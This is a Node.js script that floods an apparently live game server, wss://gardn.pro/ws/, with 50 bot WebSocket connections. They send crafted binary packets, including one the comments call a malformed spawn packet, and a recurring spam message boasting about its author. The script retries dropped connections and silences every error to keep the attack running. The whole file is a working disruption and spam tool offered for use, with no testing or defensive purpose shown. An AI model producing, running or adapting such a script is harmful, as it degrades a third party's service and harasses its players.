const WebSocket = require('ws');

// Hex strings for each message
const messages = {
  spawn: '020668696775797A00', // Malformed spawn (9 bytes, "higuys" -> "higuyz")
  heartbeat: '01000000', // 4 bytes
  connect: '0000c39c5889c7b4aaed68', // 11 bytes
  death: '0180ac0280ac0200', // 8 bytes
  movement: '0180ac020000', // 6 bytes
  custom: '051f626f6f6d666461206f72206869677579732062657374207363726970746572' // 38 bytes
};

// Number of connections to establish (reduced for low-end systems)
const numConnections = 50;
const maxRetries = 3;
const retryDelay = 2000; // 2 seconds
const connectionDelay = 100; // 100ms delay between connections

// Keep process alive with a dummy interval
setInterval(() => {}, 1000 * 60 * 60); // Run every hour

// Function to create a single WebSocket connection with retries
function createConnection(retryCount = 0) {
  const ws = new WebSocket('wss://gardn.pro/ws/');
  ws.binaryType = 'arraybuffer';

  let heartbeatInterval;

  ws.on('open', () => {
    if (ws.readyState === WebSocket.OPEN) {
      sendBinaryMessage(ws, messages.spawn);
      sendBinaryMessage(ws, messages.connect);
      sendBinaryMessage(ws, messages.death);
      sendBinaryMessage(ws, messages.movement);
    }

    // Start periodic messages (every 800ms)
    heartbeatInterval = setInterval(() => {
      if (ws.readyState === WebSocket.OPEN) {
        sendBinaryMessage(ws, messages.heartbeat);
        sendBinaryMessage(ws, messages.movement);
        sendBinaryMessage(ws, messages.custom);
      }
    }, 800);

    ws.on('close', () => {
      clearInterval(heartbeatInterval);
      if (retryCount < maxRetries) {
        setTimeout(() => createConnection(retryCount + 1), retryDelay + Math.random() * 100);
      }
    });
  });

  ws.on('error', () => {
    if (retryCount < maxRetries) {
      setTimeout(() => createConnection(retryCount + 1), retryDelay + Math.random() * 100);
    }
  });
}

// Helper function to convert hex string to ArrayBuffer
function hexToArrayBuffer(hex) {
  try {
    return Buffer.from(hex.replace(/[^0-9a-fA-F]/g, ''), 'hex');
  } catch {
    return null;
  }
}

// Helper function to send binary message
function sendBinaryMessage(ws, hex) {
  try {
    if (ws.readyState !== WebSocket.OPEN) {
      return;
    }
    const buffer = hexToArrayBuffer(hex);
    if (buffer) {
      ws.send(buffer, { binary: true });
    }
  } catch {
    // Silently handle errors
  }
}

// Handle uncaught errors to prevent process exit
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// Create connections with delay
(function connectAll(i = 0) {
  if (i < numConnections) {
    createConnection();
    setTimeout(() => connectAll(i + 1), connectionDelay);
  }
})();

// Handle SIGINT (Ctrl+C)
process.on('SIGINT', () => {
  process.exit();
});
